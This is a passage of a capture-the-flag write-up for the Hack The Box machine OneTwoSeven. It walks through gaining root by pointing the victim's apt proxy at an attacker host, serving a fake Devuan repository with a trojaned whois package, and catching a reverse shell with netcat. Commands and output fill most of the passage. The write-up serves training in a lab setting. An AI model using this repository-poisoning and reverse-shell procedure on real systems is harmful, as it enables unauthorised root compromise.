+                E:&nbsp;Unable&nbsp;to&nbsp;parse&nbsp;package&nbsp;file&nbsp;/var/lib/apt/lists/packages.onetwoseven.htb_devuan_dists_ascii_Release&nbsp;(1)<br>
+                E:&nbsp;The&nbsp;package&nbsp;lists&nbsp;or&nbsp;status&nbsp;file&nbsp;could&nbsp;not&nbsp;be&nbsp;parsed&nbsp;or&nbsp;opened.
+            </div>
+        </div><br>
+        <br>
+        It queries:<br>
+        • http://packages.onetwoseven.htb/devuan ascii InRelease<br>
+        • http://de.deb.devuan.org/merged ascii InRelease<br>
+        • http://de.deb.devuan.org/merged ascii-security InRelease<br>
+        • http://de.deb.devuan.org/merged ascii-updates InRelease<br>
+        <br>
+        The <code>de.deb.devuan.org</code> queries are to a legitimate, already existing repository.<br>
+        <br>
+        <code>packages.onetwoseven.htb</code> is a custom repository.<br>
+        This is the repository that we'll imitate and host our malicious, upgraded package on:<br>
+        • <code>http://packages.onetwoseven.htb/devuan</code><br>
+        <br>
+        <a id="h3-22" name="h3-22"></a><strong></strong>
+        <h3><strong>9b) Find directory structure of</strong></h3><strong><code></code></strong>
+        <h3><strong><code>http://packages.onetwoseven.htb/devuan</code></strong></h3><br>
+        In order to create the imitated repository on our attacking machine, we need to know the directory structure of <code>packages.onetwoseven.htb/devuan</code> and what files <code>apt-get update</code> is querying for.<br>
+        <br>
+        We basically just need to see the requests that <code>apt-get</code> is making.<br>
+        For this, I used python's <code>SimpleHTTPServer</code>.<br>
+        <br>
+        First, proxy all port 80 traffic (what apt-get is sending requests via) to your attacking machine by setting the <code>http_proxy</code> environment variable. The syntax for it is:<br>
+        <code>export http_proxy='http://&lt;attacking username&gt;:&lt;attacking password&gt;@&lt;attacking IP&gt;:&lt;attacking port&gt;'</code><br>
+        <br>
+            <div class="codebox">
+                www-admin-data@onetwoseven:/var/www$&nbsp;export&nbsp;http_proxy='http://root:asdfg@10.10.14.7:8000'<br>
+                www-admin-data@onetwoseven:/var/www$&nbsp;echo&nbsp;$http_proxy<br>
+                http://root:asdfg@10.10.14.7:8000
+            </div>
+        </div><br>
+        <br>
+        Now all port 80 traffic will be directed to our attacking machine on port 8000.<br>
+        Start <code>SimpleHTTPServer</code> on your attacking machine:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Run <code>sudo apt-get update</code> on the victim machine<br>
+            <div class="codebox">
+                www-admin-data@onetwoseven:/var/www$&nbsp;sudo&nbsp;apt-get&nbsp;update<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        And on the python <code>SimpleHTTPServer</code> you should see all of the requests made<br>
+            <div class="codebox">
+                ...<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...<br>
+                10.10.10.133&nbsp;-&nbsp;-&nbsp;[03/Jul/2019&nbsp;14:04:29]&nbsp;code&nbsp;404,&nbsp;message&nbsp;File&nbsp;not&nbsp;found<br>
+                10.10.10.133&nbsp;-&nbsp;-&nbsp;[03/Jul/2019&nbsp;14:04:29]&nbsp;"GET&nbsp;http://packages.onetwoseven.htb/devuan/dists/ascii/InRelease&nbsp;HTTP/1.1"&nbsp;404&nbsp;-<br>
+                10.10.10.133&nbsp;-&nbsp;-&nbsp;[03/Jul/2019&nbsp;14:04:29]&nbsp;code&nbsp;404,&nbsp;message&nbsp;File&nbsp;not&nbsp;found<br>
+                10.10.10.133&nbsp;-&nbsp;-&nbsp;[03/Jul/2019&nbsp;14:04:29]&nbsp;"GET&nbsp;http://de.deb.devuan.org/merged/dists/ascii/InRelease&nbsp;HTTP/1.1"&nbsp;404&nbsp;-<br>
+                10.10.10.133&nbsp;-&nbsp;-&nbsp;[03/Jul/2019&nbsp;14:04:29]&nbsp;code&nbsp;404,&nbsp;message&nbsp;File&nbsp;not&nbsp;found<br>
+                10.10.10.133&nbsp;-&nbsp;-&nbsp;[03/Jul/2019&nbsp;14:04:29]&nbsp;"GET&nbsp;http://packages.onetwoseven.htb/devuan/dists/ascii/Release&nbsp;HTTP/1.1"&nbsp;404&nbsp;-<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        The barebones needed to create a custom repository are:<br>
+        • <code>Release</code> file - holds the hash, filesize, and location of the <code>Packages</code> file<br>
+        ◇ <code>Packages</code> file - holds a list of all the packages available, hashes of those packages and the location of the <code>.deb</code> file to be installed<br>
+        ◇ <code>Packages.gz</code> file - a zipped version of <code>Packages</code> file<br>
+        ◇ <code>package.deb</code> - the package to be installed, pointed to by <code>Packages</code> file<br>
+        <br>
+        In the requests sent to <code>SimpleHTTPServer</code>, you'll find requests to each of those files:<br>
+        • <code>http://packages.onetwoseven.htb/devuan/dists/ascii/Release</code><br>
+        • <code>http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-amd64/Packages.gz</code><br>
+        • <code>http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-amd64/Packages</code><br>
+        <br>
+        By reading the URLs you now know the directory structure of the repository you need to make.<br>
+            <div class="codebox">
+                devuan/<br>
+                ├──&nbsp;dists/<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;├──&nbsp;ascii/<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;├──&nbsp;Release<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;├──&nbsp;main/<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;├──&nbsp;binary-amd64/<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;├──&nbsp;Packages<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;├──&nbsp;Packages.gz
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-10" name="h2-10"></a><strong></strong>
+        <h2><strong>10) Create Fake Repository</strong></h2><br>
+        The last thing to do is to create our fake <code>packages.onetwoseven.htb</code> repository that will serve our malicious package.<br>
+        <br>
+        We need to:<br>
+        • make directory structure<br>
+        • write a Packages file and gzip a Packages.gz file<br>
+        • write a Release file<br>
+        <br>
+        <a id="h3-23" name="h3-23"></a><strong></strong>
+        <h3><strong>10a) Make directory structure</strong></h3><br>
+        Prepare the directory structure of the repository that we discovered from the step above.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven#&nbsp;mkdir&nbsp;serve<br>
+                root@gotham:~/ctf/onetwoseven#&nbsp;cd&nbsp;serve<br>
+                root@gotham:~/ctf/onetwoseven/serve#&nbsp;mkdir&nbsp;-p&nbsp;devuan/dists/ascii/main/binary-amd64<br>
+                root@gotham:~/ctf/onetwoseven/serve#&nbsp;touch&nbsp;devuan/dists/ascii/Release<br>
+                root@gotham:~/ctf/onetwoseven/serve#&nbsp;touch&nbsp;devuan/dists/ascii/main/binary-amd64/Packages<br>
+                root@gotham:~/ctf/onetwoseven/serve#&nbsp;ls&nbsp;-R&nbsp;<br>
+                .:<br>
+                devuan<br>
+                <br>
+                ./devuan:<br>
+                dists<br>
+                <br>
+                ./devuan/dists:<br>
+                ascii<br>
+                <br>
+                ./devuan/dists/ascii:<br>
+                main&nbsp;&nbsp;Release<br>
+                <br>
+                ./devuan/dists/ascii/main:<br>
+                binary-amd64<br>
+                <br>
+                ./devuan/dists/ascii/main/binary-amd64:<br>
+                Packages
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-24" name="h3-24"></a><strong></strong>
+        <h3><strong>10b) Write Packages file</strong></h3><br>
+        The <code>Packages</code> file holds a list of all the packages available, hashes of those packages and the location of the <code>.deb</code> file to be downloaded.<br>
+        <br>
+        <strong>Get a sample Packages file</strong><br>
+        You can get a sample <code>Packages</code> entry for the <code>whois</code> package by reading the information from the <code>de.deb.devuan.org</code> repository in <code>/var/lib/apt/lists</code>.<br>
+        <br>
+        <code>de.deb.devuan.org_merged_dists_ascii_main_binary-amd64_Packages</code> contains the <code>whois</code> package.<br>
+        This file is huge.<br>
+        <br>
+        You know the md5 hash of the <code>whois</code> package from running <code>apt-cache show whois</code> earlier, so use that md5 hash as a unique string to grep the file for the <code>whois</code> information.<br>
+            <div class="codebox">
+                www-admin-data@onetwoseven:/var/www$&nbsp;apt-cache&nbsp;show&nbsp;whois<br>
+                ...<br>
+                MD5sum:&nbsp;ac528a3b41bcdc8e78084d61e4aa2957<br>
+                ...<br>
+                www-admin-data@onetwoseven:/var/www$&nbsp;cat&nbsp;/var/lib/apt/lists/de.deb.devuan.org_merged_dists_ascii_main_binary-amd64_Packages&nbsp;|&nbsp;grep&nbsp;-B&nbsp;20&nbsp;-A&nbsp;20&nbsp;"ac528a3b41bcdc8e78084d61e4aa2957"<br>
+                ...<br>
+                Package:&nbsp;whois<br>
+                Version:&nbsp;5.2.17~deb9u1<br>
+                Installed-Size:&nbsp;343<br>
+                Maintainer:&nbsp;Marco&nbsp;d'Itri&nbsp;&lt;md@linux.it&gt;<br>
+                Architecture:&nbsp;amd64<br>
+                Depends:&nbsp;libc6&nbsp;(&gt;=&nbsp;2.15),&nbsp;libidn11&nbsp;(&gt;=&nbsp;1.13)<br>
+                Description:&nbsp;intelligent&nbsp;WHOIS&nbsp;client<br>
+                Description-md5:&nbsp;28e9df99a50bdfe098edfcf773417990<br>
+                Tag:&nbsp;implemented-in::c,&nbsp;interface::commandline,&nbsp;network::client,<br>
+                &nbsp;protocol::ip,&nbsp;protocol::ipv6,&nbsp;role::program,&nbsp;suite::gnu,&nbsp;use::checking,<br>
+                &nbsp;use::searching<br>
+                Section:&nbsp;net<br>
+                Priority:&nbsp;optional<br>
+                Filename:&nbsp;pool/DEBIAN/main/w/whois/whois_5.2.17~deb9u1_amd64.deb<br>
+                Size:&nbsp;76772<br>
+                MD5sum:&nbsp;ac528a3b41bcdc8e78084d61e4aa2957<br>
+                SHA256:&nbsp;296aa4d2bb6ee15c7db129a4a3a0c8abbf1acb75770b4ee9241a47ee2ca37551<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <strong>Create Packages file</strong><br>
+        <br>
+        This sample needs to be updated with:<br>
+        • Version - the version number of the “updated� package we specified earlier<br>
+        ◇ <code>5.2.18~deb9u1</code><br>
+        • Filename - the location of the <code>whois.deb</code> package to be downloaded<br>
+        ◇ I'm storing my malicious <code>whois.deb</code> in the <code>binary-amd64</code> folder, so that's what I'll specify<br>
+        ◇ <code>dists/ascii/main/binary-amd64/whois_5.2.18~deb9u1_amd64.deb</code><br>
+        • Size - the size of the malicious <code>whois.deb</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven/serve/devuan/dists/ascii/main/binary-amd64#&nbsp;ls&nbsp;-l&nbsp;whois_5.2.18~deb9u1_amd64.deb&nbsp;<br>
+                -rw-r--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;77120&nbsp;Jul&nbsp;&nbsp;2&nbsp;19:00&nbsp;whois_5.2.18~deb9u1_amd64.deb
+            </div>
+        </div><br>
+        • MD5sum and SHA255 - the hashes of the malicious <code>whois.deb</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven/serve/devuan/dists/ascii/main/binary-amd64#&nbsp;md5sum&nbsp;whois_5.2.18~deb9u1_amd64.deb;&nbsp;sha256sum&nbsp;whois_5.2.18~deb9u1_amd64.deb&nbsp;<br>
+                18dafd32bdc262c3b9fae87f939988e9&nbsp;&nbsp;whois_5.2.18~deb9u1_amd64.deb<br>
+                bdba529e6ef133492cb7d6d800c7373466f25671e8bd64039b02b69c9f53847c&nbsp;&nbsp;whois_5.2.18~deb9u1_amd64.deb
+            </div>
+        </div><br>
+        <br>
+        My <code>Packages</code> file looked like this:<br>
+            <div class="codebox">
+                Package:&nbsp;whois<br>
+                Version:&nbsp;5.2.18~deb9u1<br>
+                Installed-Size:&nbsp;343<br>
+                Maintainer:&nbsp;Marco&nbsp;d'Itri&nbsp;&lt;md@linux.it&gt;<br>
+                Architecture:&nbsp;amd64<br>
+                Depends:&nbsp;libc6&nbsp;(&gt;=&nbsp;2.15),&nbsp;libidn11&nbsp;(&gt;=&nbsp;1.13)<br>
+                Description:&nbsp;intelligent&nbsp;WHOIS&nbsp;client<br>
+                Description-md5:&nbsp;28e9df99a50bdfe098edfcf773417990<br>
+                Tag:&nbsp;implemented-in::c,&nbsp;interface::commandline,&nbsp;network::client,<br>
+                &nbsp;protocol::ip,&nbsp;protocol::ipv6,&nbsp;role::program,&nbsp;suite::gnu,&nbsp;use::checking,<br>
+                &nbsp;use::searching<br>
+                Section:&nbsp;net<br>
+                Priority:&nbsp;optional<br>
+                Filename:&nbsp;dists/ascii/main/binary-amd64/whois_5.2.18~deb9u1_amd64.deb<br>
+                Size:&nbsp;77120<br>
+                MD5sum:&nbsp;18dafd32bdc262c3b9fae87f939988e9<br>
+                SHA256:&nbsp;bdba529e6ef133492cb7d6d800c7373466f25671e8bd64039b02b69c9f53847c
+            </div>
+        </div><br>
+        <br>
+        Create a Packages.gz version of the file<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven/serve/devuan/dists/ascii/main/binary-amd64#&nbsp;gzip&nbsp;Packages&nbsp;-c&nbsp;&gt;&nbsp;Packages.gz<br>
+                root@gotham:~/ctf/onetwoseven/serve/devuan/dists/ascii/main/binary-amd64#&nbsp;ls&nbsp;-l<br>
+                total&nbsp;84<br>
+                -rw-r--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;632&nbsp;Jul&nbsp;&nbsp;3&nbsp;16:35&nbsp;Packages<br>
+                -rw-r--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;467&nbsp;Jul&nbsp;&nbsp;3&nbsp;16:42&nbsp;Packages.gz<br>
+                -rw-r--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;77120&nbsp;Jul&nbsp;&nbsp;2&nbsp;19:00&nbsp;whois_5.2.18~deb9u1_amd64.deb
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-25" name="h3-25"></a><strong></strong>
+        <h3><strong>10c) Write Release file</strong></h3><br>
+        The Release file holds the hash, filesize, and location of the <code>Packages</code> file we created above.<br>
+        <br>
+        <strong>Get a sample Release file</strong><br>
+        You can get a sample <code>Release</code> file to copy from one that already exists in <code>/var/lib/apt/lists</code> from the <code>de.deb.devuan.org</code> repositories<br>
+        <br>
+        <code>de.deb.devuan.org_merged_dists_ascii_InRelease</code> is the Release file.<br>
+        <br>
+            <div class="codebox">
+                www-admin-data@onetwoseven:/var/www$&nbsp;cat&nbsp;/var/lib/apt/lists/de.deb.devuan.org_merged_dists_ascii_InRelease<br>
+                -----BEGIN&nbsp;PGP&nbsp;SIGNED&nbsp;MESSAGE-----<br>
+                Hash:&nbsp;SHA512<br>
+                <br>
+                Origin:&nbsp;Devuan<br>
+                Label:&nbsp;Devuan<br>
+                Suite:&nbsp;stable<br>
+                Version:&nbsp;2.0<br>
+                Codename:&nbsp;ascii<br>
+                Date:&nbsp;Mon,&nbsp;01&nbsp;Apr&nbsp;2019&nbsp;01:30:06&nbsp;UTC<br>
+                Architectures:&nbsp;&nbsp;amd64&nbsp;arm64&nbsp;armel&nbsp;armhf&nbsp;i386&nbsp;ppc64el<br>
+                Components:&nbsp;main&nbsp;contrib&nbsp;non-free&nbsp;raspi&nbsp;beaglebone&nbsp;droid4&nbsp;n900&nbsp;n950&nbsp;n9&nbsp;sunxi&nbsp;exynos<br>
+                SHA256:<br>
+                &nbsp;108a19c022b850eb527adcfa4b2c130eebd7ed145f1fb638e5d0e4af3365f971&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;97&nbsp;non-free/debian-installer/binary-i386/Release<br>
+                &nbsp;b15a98000fd92e071aa8f79acf4abe635993002d1fea51893879045e998783a1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;34&nbsp;main/Contents-all.gz<br>
+                &nbsp;0040f94d11d0039505328a90b2ff48968db873e9e7967307631bf40ef5679275&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;32&nbsp;contrib/debian-installer/binary-armel/Packages.xz<br>
+                &nbsp;a466d4c12073f44d3bbba787a396c44d6de64b31a080c696b7a393d9f9fdb412&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;97&nbsp;contrib/debian-installer/binary-arm64/Release<br>
+                &nbsp;...
+            </div>
+        </div><br>
+        <br>
+        <strong>Create Release file</strong><br>
+        <br>
+        The sample needs to be modified:<br>
+        • Origin - you can set this to whatever you like<br>
+        • Label - set this to whatever you like<br>
+        • Architectures - we're only serving <code>amd64</code><br>
+        • Components - we're only serving <code>main</code><br>
+        • SHA256 - need the hashes of the <code>Packages</code> and <code>Packages.gz</code> files, the size of both those files and their location<br>
+        <br>
+        Calculate the hashes of the <code>Packages</code> and <code>Packages.gz</code> files<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven/serve/devuan/dists/ascii/main/binary-amd64#&nbsp;sha256sum&nbsp;Packages;&nbsp;sha256sum&nbsp;Packages.gz<br>
+                5d84f510bb2c1caeebfd0e23c5a9e0527ed23e5c46c37588cb193cd728f18b37&nbsp;&nbsp;Packages<br>
+                5014d0099e59dc414fe90007dbb9184a1508258565624dcc00e266c73dad0343&nbsp;&nbsp;Packages.gz
+            </div>
+        </div><br>
+        <br>
+        And retrieve the size of them<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven/serve/devuan/dists/ascii/main/binary-amd64#&nbsp;ls&nbsp;-l<br>
+                total&nbsp;84<br>
+                -rw-r--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;632&nbsp;Jul&nbsp;&nbsp;3&nbsp;16:35&nbsp;Packages<br>
+                -rw-r--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;467&nbsp;Jul&nbsp;&nbsp;3&nbsp;16:42&nbsp;Packages.gz
+            </div>
+        </div><br>
+        <br>
+        My <code>Release</code> file looked like this:<br>
+            <div class="codebox">
+                Origin:&nbsp;toucan<br>
+                Label:&nbsp;toucan<br>
+                Suite:&nbsp;stable<br>
+                Version:&nbsp;2.0<br>
+                Codename:&nbsp;ascii<br>
+                Date:&nbsp;Mon,&nbsp;01&nbsp;Apr&nbsp;2019&nbsp;01:30:06&nbsp;UTC<br>
+                Architectures:&nbsp;&nbsp;amd64<br>
+                Components:&nbsp;main<br>
+                SHA256:<br>
+                &nbsp;5d84f510bb2c1caeebfd0e23c5a9e0527ed23e5c46c37588cb193cd728f18b37&nbsp;632&nbsp;main/binary-amd64/Packages<br>
+                &nbsp;5014d0099e59dc414fe90007dbb9184a1508258565624dcc00e266c73dad0343&nbsp;467&nbsp;main/binary-amd64/Packages.gz
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-11" name="h2-11"></a><strong></strong>
+        <h2><strong>11) Serve Fake Repository and Get Root</strong></h2><br>
+        And now, finally, we can serve our fake repository via Apache and get root.<br>
+        <br>
+        Copy the <code>devuan</code> directory and its contents into <code>/var/www/html</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven/serve#&nbsp;cp&nbsp;-R&nbsp;devuan&nbsp;/var/www/html<br>
+                root@gotham:~/ctf/onetwoseven/serve#&nbsp;ls&nbsp;-l&nbsp;/var/www/html<br>
+                total&nbsp;24<br>
+                drwxr-xr-x&nbsp;3&nbsp;root&nbsp;root&nbsp;&nbsp;4096&nbsp;Jul&nbsp;&nbsp;3&nbsp;16:55&nbsp;devuan<br>
+                -rw-r--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;10701&nbsp;Feb&nbsp;28&nbsp;19:45&nbsp;index.html
+            </div>
+        </div><br>
+        <br>
+        Start the Apache service<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven#&nbsp;service&nbsp;apache2&nbsp;start
+            </div>
+        </div><br>
+        <br>
+        And start a listener on your attacking machine to receive your reverse shell<br>
+        (make the sure the port and IP is the same as what you wrote in the malicious <code>whois</code> package)<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven#&nbsp;nc&nbsp;-lvnp&nbsp;9002<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Set your <code>http_proxy</code> on the victim machine to your attacking IP and port 80, where Apache is listening<br>
+            <div class="codebox">
+                www-admin-data@onetwoseven:/var/www$&nbsp;export&nbsp;http_proxy='http://root:asdfg@10.10.14.7:80'<br>
+                www-admin-data@onetwoseven:/var/www$&nbsp;echo&nbsp;$http_proxy<br>
+                http://root:asdfg@10.10.14.7:80
+            </div>
+        </div><br>
+        <br>
+        Run <code>sudo apt-get update</code> on the victim machine to search for upgraded binaries (fingers crossed our <code>whois</code> package)<br>
+        <br>
+        You should see a <code>Get</code> on<br>
+        • <code>http://packages.onetwoseven.htb/devuan ascii Release</code><br>
+        • and <code>http://packages.onetwoseven.htb/devuan ascii/main amd64 Packages</code><br>
+        ◇ which means that <code>apt</code> queried Apache successfully.<br>
+            <div class="codebox">
+                www-admin-data@onetwoseven:/var/www$&nbsp;sudo&nbsp;apt-get&nbsp;update<br>
+                Ign:1&nbsp;http://packages.onetwoseven.htb/devuan&nbsp;ascii&nbsp;InRelease<br>
+                Ign:2&nbsp;http://de.deb.devuan.org/merged&nbsp;ascii&nbsp;InRelease<br>
+                Get:3&nbsp;http://packages.onetwoseven.htb/devuan&nbsp;ascii&nbsp;Release&nbsp;[353&nbsp;B]<br>
+                Ign:4&nbsp;http://de.deb.devuan.org/merged&nbsp;ascii-security&nbsp;InRelease<br>
+                Ign:5&nbsp;http://packages.onetwoseven.htb/devuan&nbsp;ascii&nbsp;Release.gpg<br>
+                Ign:6&nbsp;http://de.deb.devuan.org/merged&nbsp;ascii-updates&nbsp;InRelease<br>
+                Get:7&nbsp;http://packages.onetwoseven.htb/devuan&nbsp;ascii/main&nbsp;amd64&nbsp;Packages&nbsp;[467&nbsp;B]<br>
+                Err:8&nbsp;http://de.deb.devuan.org/merged&nbsp;ascii&nbsp;Release<br>
+                &nbsp;&nbsp;404&nbsp;&nbsp;Not&nbsp;Found<br>
+                Err:9&nbsp;http://de.deb.devuan.org/merged&nbsp;ascii-security&nbsp;Release<br>
+                &nbsp;&nbsp;404&nbsp;&nbsp;Not&nbsp;Found<br>
+                Err:10&nbsp;http://de.deb.devuan.org/merged&nbsp;ascii-updates&nbsp;Release<br>
+                &nbsp;&nbsp;404&nbsp;&nbsp;Not&nbsp;Found<br>
+                Reading&nbsp;package&nbsp;lists...&nbsp;Done<br>
+                W:&nbsp;The&nbsp;repository&nbsp;'http://packages.onetwoseven.htb/devuan&nbsp;ascii&nbsp;Release'&nbsp;is&nbsp;not&nbsp;signed.<br>
+                N:&nbsp;Data&nbsp;from&nbsp;such&nbsp;a&nbsp;repository&nbsp;can't&nbsp;be&nbsp;authenticated&nbsp;and&nbsp;is&nbsp;therefore&nbsp;potentially&nbsp;dangerous&nbsp;to&nbsp;use.<br>
+                N:&nbsp;See&nbsp;apt-secure(8)&nbsp;manpage&nbsp;for&nbsp;repository&nbsp;creation&nbsp;and&nbsp;user&nbsp;configuration&nbsp;details.<br>
+                E:&nbsp;The&nbsp;repository&nbsp;'http://de.deb.devuan.org/merged&nbsp;ascii&nbsp;Release'&nbsp;does&nbsp;no&nbsp;longer&nbsp;have&nbsp;a&nbsp;Release&nbsp;file.<br>
+                N:&nbsp;Updating&nbsp;from&nbsp;such&nbsp;a&nbsp;repository&nbsp;can't&nbsp;be&nbsp;done&nbsp;securely,&nbsp;and&nbsp;is&nbsp;therefore&nbsp;disabled&nbsp;by&nbsp;default.<br>
+                N:&nbsp;See&nbsp;apt-secure(8)&nbsp;manpage&nbsp;for&nbsp;repository&nbsp;creation&nbsp;and&nbsp;user&nbsp;configuration&nbsp;details.<br>
+                E:&nbsp;The&nbsp;repository&nbsp;'http://de.deb.devuan.org/merged&nbsp;ascii-security&nbsp;Release'&nbsp;does&nbsp;no&nbsp;longer&nbsp;have&nbsp;a&nbsp;Release&nbsp;file.<br>
+                N:&nbsp;Updating&nbsp;from&nbsp;such&nbsp;a&nbsp;repository&nbsp;can't&nbsp;be&nbsp;done&nbsp;securely,&nbsp;and&nbsp;is&nbsp;therefore&nbsp;disabled&nbsp;by&nbsp;default.<br>
+                N:&nbsp;See&nbsp;apt-secure(8)&nbsp;manpage&nbsp;for&nbsp;repository&nbsp;creation&nbsp;and&nbsp;user&nbsp;configuration&nbsp;details.<br>
+                E:&nbsp;The&nbsp;repository&nbsp;'http://de.deb.devuan.org/merged&nbsp;ascii-updates&nbsp;Release'&nbsp;does&nbsp;no&nbsp;longer&nbsp;have&nbsp;a&nbsp;Release&nbsp;file.<br>
+                N:&nbsp;Updating&nbsp;from&nbsp;such&nbsp;a&nbsp;repository&nbsp;can't&nbsp;be&nbsp;done&nbsp;securely,&nbsp;and&nbsp;is&nbsp;therefore&nbsp;disabled&nbsp;by&nbsp;default.<br>
+                N:&nbsp;See&nbsp;apt-secure(8)&nbsp;manpage&nbsp;for&nbsp;repository&nbsp;creation&nbsp;and&nbsp;user&nbsp;configuration&nbsp;details.
+            </div>
+        </div><br>
+        <br>
+        Run <code>sudo apt-get upgrade</code> and answer <code>y</code> to installing the <code>whois</code> package<br>
+            <div class="codebox">
+                www-admin-data@onetwoseven:/var/www$&nbsp;sudo&nbsp;apt-get&nbsp;upgrade<br>
+                Reading&nbsp;package&nbsp;lists...&nbsp;Done<br>
+                Building&nbsp;dependency&nbsp;tree&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Reading&nbsp;state&nbsp;information...&nbsp;Done<br>
+                Calculating&nbsp;upgrade...&nbsp;Done<br>
+                The&nbsp;following&nbsp;packages&nbsp;will&nbsp;be&nbsp;upgraded:<br>
+                &nbsp;&nbsp;whois<br>
+                1&nbsp;upgraded,&nbsp;0&nbsp;newly&nbsp;installed,&nbsp;0&nbsp;to&nbsp;remove&nbsp;and&nbsp;0&nbsp;not&nbsp;upgraded.<br>
+                Need&nbsp;to&nbsp;get&nbsp;77.1&nbsp;kB&nbsp;of&nbsp;archives.<br>
+                After&nbsp;this&nbsp;operation,&nbsp;0&nbsp;B&nbsp;of&nbsp;additional&nbsp;disk&nbsp;space&nbsp;will&nbsp;be&nbsp;used.<br>
+                Do&nbsp;you&nbsp;want&nbsp;to&nbsp;continue?&nbsp;[Y/n]&nbsp;y<br>
+                y<br>
+                WARNING:&nbsp;The&nbsp;following&nbsp;packages&nbsp;cannot&nbsp;be&nbsp;authenticated!<br>
+                &nbsp;&nbsp;whois<br>
+                Install&nbsp;these&nbsp;packages&nbsp;without&nbsp;verification?&nbsp;[y/N]&nbsp;y<br>
+                y<br>
+                Get:1&nbsp;http://packages.onetwoseven.htb/devuan&nbsp;ascii/main&nbsp;amd64&nbsp;whois&nbsp;amd64&nbsp;5.2.18~deb9u1&nbsp;[77.1&nbsp;kB]<br>
+                Fetched&nbsp;77.1&nbsp;kB&nbsp;in&nbsp;0s&nbsp;(300&nbsp;kB/s)<br>
+                Reading&nbsp;changelogs...&nbsp;Done<br>
+                debconf:&nbsp;unable&nbsp;to&nbsp;initialize&nbsp;frontend:&nbsp;Dialog<br>
+                debconf:&nbsp;(Dialog&nbsp;frontend&nbsp;will&nbsp;not&nbsp;work&nbsp;on&nbsp;a&nbsp;dumb&nbsp;terminal,&nbsp;an&nbsp;emacs&nbsp;shell&nbsp;buffer,&nbsp;or&nbsp;without&nbsp;a&nbsp;controlling&nbsp;terminal.)<br>
+                debconf:&nbsp;falling&nbsp;back&nbsp;to&nbsp;frontend:&nbsp;Readline<br>
+                (Reading&nbsp;database&nbsp;...&nbsp;33940&nbsp;files&nbsp;and&nbsp;directories&nbsp;currently&nbsp;installed.)<br>
+                Preparing&nbsp;to&nbsp;unpack&nbsp;.../whois_5.2.18~deb9u1_amd64.deb&nbsp;...<br>
+                Unpacking&nbsp;whois&nbsp;(5.2.18~deb9u1)&nbsp;over&nbsp;(5.2.17~deb9u1)&nbsp;...<br>
+                Setting&nbsp;up&nbsp;whois&nbsp;(5.2.18~deb9u1)&nbsp;...<br>
+                ...&nbsp;�&nbsp;should&nbsp;get&nbsp;a&nbsp;reverse&nbsp;shell&nbsp;at&nbsp;this&nbsp;point
+            </div>
+        </div><br>
+        <br>
+        You should get a callback on your listener.<br>
+        Root!<br>
+            <div class="codebox">
